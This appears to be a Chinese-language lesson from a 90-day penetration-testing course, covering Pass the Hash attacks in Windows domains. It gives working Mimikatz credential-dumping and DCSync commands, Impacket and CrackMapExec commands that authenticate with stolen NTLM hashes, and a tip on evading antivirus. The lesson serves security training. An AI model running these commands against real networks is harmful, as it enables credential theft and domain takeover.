---
title: Day067ï¼šå†…ç½‘æ¸—é€ - Pass the Hash æ”»å‡»
tags:
  - ç½‘ç»œå®‰å…¨
  - æ¸—é€æµ‹è¯•
  - å†…ç½‘æ¸—é€
categories:
  - 90å¤©å®‰å…¨çªå‡»
stage: å®æˆ˜æ¼”ç»ƒ
abbrlink: 85edb
date: 2026-01-28
updated: 2026-01-28
---

# Day067ï¼šå†…ç½‘æ¸—é€ - Pass the Hash æ”»å‡»

## ğŸ“‹ åŸºæœ¬ä¿¡æ¯

| é¡¹ç›® | å†…å®¹ |
|------|------|
| **æ‰€å±é˜¶æ®µ** | ğŸ† å®æˆ˜æ¼”ç»ƒï¼ˆç¬¬ä¸‰é˜¶æ®µï¼‰ |
| **æ‰€å±å‘¨æ¬¡** | Week 11-12ï¼šå†…ç½‘æ¸—é€åŸºç¡€ |
| **ä»Šæ—¥ä¸»é¢˜** | Pass the Hash æ”»å‡» |
| **é¢„è®¡æ—¶é—´** | 3-4 å°æ—¶ |
| **éš¾åº¦ç­‰çº§** | â­â­â­â­ ä¸­é«˜çº§ |

---

## ğŸ”¥ ä»Šæ—¥ç—›ç‚¹åœºæ™¯

> **åœºæ™¯**ï¼šä½ åœ¨å†…ç½‘æ”¶é›†ä¿¡æ¯æ—¶å‘ç°ä¸€å°æœºå™¨ä¸Šç™»å½•è¿‡åŸŸç®¡ç†å‘˜ã€‚ä½ ç”¨ Mimikatz æŠ“åˆ°äº†åŸŸç®¡çš„ NTLM Hashï¼Œä½†ä¸çŸ¥é“æ˜æ–‡å¯†ç ã€‚
>
> **é—®é¢˜**ï¼šä¸çŸ¥é“å¯†ç ï¼Œèƒ½ç™»å½•å…¶ä»–æœºå™¨å—ï¼Ÿ
>
> **ä»Šå¤©çš„ä»»åŠ¡**ï¼šä½¿ç”¨ Pass the Hash æŠ€æœ¯ï¼Œç”¨ Hash ç›´æ¥è®¤è¯ç™»å½•ã€‚

---

## ğŸ¯ ä»Šæ—¥ç›®æ ‡

å®Œæˆä»Šå¤©çš„å­¦ä¹ åï¼Œä½ åº”è¯¥èƒ½å¤Ÿï¼š

- [ ] ç†è§£ NTLM è®¤è¯çš„åŸç†
- [ ] ä½¿ç”¨ Mimikatz æå– Hash
- [ ] æ‰§è¡Œ Pass the Hash æ”»å‡»
- [ ] ä½¿ç”¨å¤šç§å·¥å…·è¿›è¡Œ PTH

**é—¯å…³æ¡ä»¶**ï¼šä½¿ç”¨æŠ“å–çš„ Hash æˆåŠŸç™»å½•å¦ä¸€å°æœºå™¨ã€‚

---

## âš”ï¸ å®æˆ˜ä»»åŠ¡ï¼ˆå…ˆåŠ¨æ‰‹ï¼ï¼‰

### ä»»åŠ¡ 1ï¼šç†è§£ NTLM è®¤è¯ï¼ˆ20 åˆ†é’Ÿï¼‰

**NTLM è®¤è¯æµç¨‹**ï¼š

```
å®¢æˆ·ç«¯                    æœåŠ¡ç«¯
   â”‚                        â”‚
   â”‚ â”€â”€â”€â”€â”€â”€â”€ ç”¨æˆ·å â”€â”€â”€â”€â”€â”€â”€â†’â”‚
   â”‚                        â”‚
   â”‚ â†â”€â”€â”€â”€â”€â”€ Challenge â”€â”€â”€â”€â”€â”‚  (éšæœºæ•°)
   â”‚                        â”‚
   â”‚ â”€â”€â”€â”€â”€â”€â”€ Response â”€â”€â”€â”€â”€â†’â”‚  (Hash åŠ å¯† Challenge)
   â”‚                        â”‚
   â”‚     æœåŠ¡ç«¯éªŒè¯ Response  â”‚
   â”‚     (ç”¨æœ¬åœ° Hash è®¡ç®—)  â”‚
```

**å…³é”®ç‚¹**ï¼šæœåŠ¡ç«¯åªéªŒè¯ Responseï¼Œä¸éœ€è¦çŸ¥é“æ˜æ–‡å¯†ç ï¼

---

### ä»»åŠ¡ 2ï¼šä½¿ç”¨ Mimikatz æå– Hashï¼ˆ40 åˆ†é’Ÿï¼‰

**åœ¨å·²æ§åˆ¶çš„ Windows æœºå™¨ä¸Šï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰**ï¼š

```cmd
:: è¿è¡Œ Mimikatz
mimikatz.exe

:: è·å–è°ƒè¯•æƒé™
privilege::debug

:: å¯¼å‡ºå†…å­˜ä¸­çš„ Hash
sekurlsa::logonpasswords

:: å¯¼å‡º SAM æ•°æ®åº“ Hash
lsadump::sam

:: å¯¼å‡ºåŸŸæ§ Hashï¼ˆéœ€è¦åŸŸç®¡æƒé™ï¼‰
lsadump::dcsync /user:administrator
```

**é¢„æœŸè¾“å‡º**ï¼š
```
Authentication Id : 0 ; 12345678
Session           : Interactive
User Name         : Administrator
Domain            : CORP
NTLM              : aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

---

### ä»»åŠ¡ 3ï¼šä½¿ç”¨ Mimikatz PTHï¼ˆ30 åˆ†é’Ÿï¼‰

```cmd
:: ä½¿ç”¨ Hash æ‰“å¼€æ–°çš„ cmd
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0

:: åœ¨æ–°çª—å£ä¸­æ‰§è¡Œå‘½ä»¤
dir \\dc01\c$
psexec \\dc01 cmd
```

---

### ä»»åŠ¡ 4ï¼šä½¿ç”¨ Impacket PTHï¼ˆ30 åˆ†é’Ÿï¼‰

**åœ¨ Kali ä¸Šé€šè¿‡ä»£ç†æ‰§è¡Œ**ï¼š

```bash
# ä½¿ç”¨ psexec
proxychains4 impacket-psexec CORP/Administrator@10.0.0.100 -hashes aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# ä½¿ç”¨ wmiexec
proxychains4 impacket-wmiexec CORP/Administrator@10.0.0.100 -hashes aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# ä½¿ç”¨ smbexec
proxychains4 impacket-smbexec CORP/Administrator@10.0.0.100 -hashes aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

---

### ä»»åŠ¡ 5ï¼šä½¿ç”¨ CrackMapExec PTHï¼ˆ20 åˆ†é’Ÿï¼‰

```bash
# éªŒè¯ Hash æ˜¯å¦æœ‰æ•ˆ
proxychains4 crackmapexec smb 10.0.0.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# æ‰¹é‡æ£€æµ‹
proxychains4 crackmapexec smb 10.0.0.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# æ‰§è¡Œå‘½ä»¤
proxychains4 crackmapexec smb 10.0.0.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x "whoami"
```

---

## âœ… ä»Šæ—¥é—¯å…³æ£€æŸ¥

| æ£€æŸ¥é¡¹ | çŠ¶æ€ |
|--------|------|
| ç†è§£ NTLM è®¤è¯åŸç† | â¬œ |
| Mimikatz æˆåŠŸæå– Hash | â¬œ |
| Mimikatz PTH æˆåŠŸ | â¬œ |
| Impacket PTH æˆåŠŸ | â¬œ |
| CrackMapExec PTH æˆåŠŸ | â¬œ |

---

## ğŸ“– åº•å±‚è¡¥è¯¾ï¼ˆåšå®Œå®éªŒå†çœ‹ï¼‰

### ä¸ºä»€ä¹ˆ PTH èƒ½æˆåŠŸï¼Ÿ

NTLM è®¤è¯è®¾è®¡ç¼ºé™·ï¼š
1. æœåŠ¡ç«¯å­˜å‚¨ Hashï¼Œä¸æ˜¯æ˜æ–‡
2. è®¤è¯åªéœ€è¦è¯æ˜ã€Œä½ æœ‰ Hashã€
3. ä¸éœ€è¦è¯æ˜ã€Œä½ çŸ¥é“å¯†ç ã€

### NTLM Hash æ ¼å¼

```
LM Hash : NT Hash
aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
         â†‘                              â†‘
    é€šå¸¸ä¸ºç©ºå€¼                      è¿™ä¸ªæ‰é‡è¦
```

### PTH å·¥å…·å¯¹æ¯”

| å·¥å…· | ä¼˜ç‚¹ | ç¼ºç‚¹ |
|------|------|------|
| Mimikatz PTH | åŸç”Ÿ Windows | éœ€è¦ä¸Šä¼ åˆ°ç›®æ ‡ |
| Impacket | Linux åŸç”Ÿ | éœ€è¦ä»£ç† |
| CrackMapExec | æ‰¹é‡æ“ä½œ | åŠŸèƒ½ç›¸å¯¹ç®€å• |
| Evil-WinRM | èµ° WinRM | éœ€è¦ 5985 ç«¯å£ |

---

## âš ï¸ é¿å‘æŒ‡å—

| å‘ç‚¹ | ç—‡çŠ¶ | è§£å†³æ–¹æ¡ˆ |
|------|------|----------|
| Hash æ ¼å¼é”™è¯¯ | è®¤è¯å¤±è´¥ | ç¡®è®¤æ˜¯ LM:NT æ ¼å¼ |
| æƒé™ä¸è¶³ | æ— æ³• dump | éœ€è¦æœ¬åœ°ç®¡ç†å‘˜æƒé™ |
| ç«¯å£è¢«å° | è¿æ¥è¶…æ—¶ | å°è¯•ä¸åŒå·¥å…·ï¼ˆ445/135/5985ï¼‰ |
| AV æ‹¦æˆª | Mimikatz è¢«æ€ | ç”¨å…æ€ç‰ˆæœ¬æˆ–å†…å­˜æ‰§è¡Œ |

---

## ğŸ’¡ çŸ¥è¯†å¡ç‰‡é€ŸæŸ¥

### Mimikatz å¸¸ç”¨å‘½ä»¤

| å‘½ä»¤ | ä½œç”¨ |
|------|------|
| `privilege::debug` | è·å–è°ƒè¯•æƒé™ |
| `sekurlsa::logonpasswords` | å¯¼å‡ºç™»å½•å‡­æ® |
| `lsadump::sam` | å¯¼å‡º SAM |
| `lsadump::dcsync` | ä» DC åŒæ­¥ Hash |
| `sekurlsa::pth` | Pass the Hash |

### Hash æ¥æº

| æ¥æº | è¯´æ˜ |
|------|------|
| lsass.exe å†…å­˜ | ç™»å½•ç”¨æˆ·çš„ Hash |
| SAM æ•°æ®åº“ | æœ¬åœ°ç”¨æˆ· Hash |
| NTDS.dit | åŸŸæ‰€æœ‰ç”¨æˆ· Hash |
| ç¼“å­˜å‡­æ® | DCC2 æ ¼å¼ |

---

## â“ å¸¸è§é—®é¢˜

**Q1ï¼šPTH å’Œå¯†ç çˆ†ç ´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ**

A1ï¼šPTH ç›´æ¥ç”¨ Hash è®¤è¯ï¼Œä¸éœ€è¦è¿˜åŸå¯†ç ï¼›å¯†ç çˆ†ç ´éœ€è¦çŒœæµ‹æ˜æ–‡ã€‚

**Q2ï¼šæŠ“åˆ°çš„ Hash æ€ä¹ˆç ´è§£ï¼Ÿ**

A2ï¼šå¯ä»¥ç”¨ hashcat æˆ– john ç ´è§£ï¼Œä½† PTH é€šå¸¸æ›´å¿«æ›´ç›´æ¥ã€‚

**Q3ï¼šæ‰€æœ‰ Windows éƒ½èƒ½ PTH å—ï¼Ÿ**

A3ï¼šé»˜è®¤å¯ä»¥ã€‚ä½†å¦‚æœå¯ç”¨äº†ã€Œç¦ç”¨ NTLMã€æˆ–ä½¿ç”¨ Kerberos Onlyï¼ŒPTH ä¼šå¤±è´¥ã€‚

---

## ğŸš€ æ˜æ—¥é¢„å‘Š

**Day 068ï¼šå†…ç½‘æ¸—é€ - WMI/DCOM/PsExec æ¨ªå‘ç§»åŠ¨**

æ˜å¤©ä½ å°†ï¼š
- ä½¿ç”¨ WMI è¿œç¨‹æ‰§è¡Œå‘½ä»¤
- ä½¿ç”¨ PsExec å»ºç«‹è¿œç¨‹ shell
- äº†è§£ DCOM æ¨ªå‘ç§»åŠ¨

---

## ğŸ“Š å­¦ä¹ è®°å½•ï¼ˆå­¦ä¹ è€…å¡«å†™ï¼‰

| é¡¹ç›® | å†…å®¹ |
|------|------|
| å®é™…å­¦ä¹ æ—¥æœŸ | ____å¹´__æœˆ__æ—¥ |
| å®é™…ç”¨æ—¶ | ____ å°æ—¶ |
| é‡åˆ°çš„é—®é¢˜ | |
| è§£å†³æ–¹æ³• | |
| ä»Šæ—¥æ”¶è· | |
| è‡ªè¯„åˆ†æ•° | â­â­â­â­â­ (1-5æ˜Ÿ) |

---

> ğŸ’¬ **å¯¼å¸ˆç‚¹è¯„**ï¼š
>
> PTH æ˜¯å†…ç½‘æ¸—é€çš„æ ¸å¿ƒæŠ€æœ¯ã€‚æ‹¿åˆ° Hash å°±ç­‰äºæ‹¿åˆ°é’¥åŒ™ã€‚
>
> Mimikatz æ˜¯ Windows æ¸—é€çš„ç¥å™¨ï¼Œæ¯ä¸ªçº¢é˜Ÿäººå‘˜éƒ½å¿…é¡»æŒæ¡ã€‚
>
> è®°ä½ï¼šä¸ç”¨çŸ¥é“å¯†ç ï¼Œæœ‰ Hash å°±å¤Ÿäº†ã€‚

```bash
echo "Day 067 Complete! Pass the Hash æŒæ¡ï¼"
```
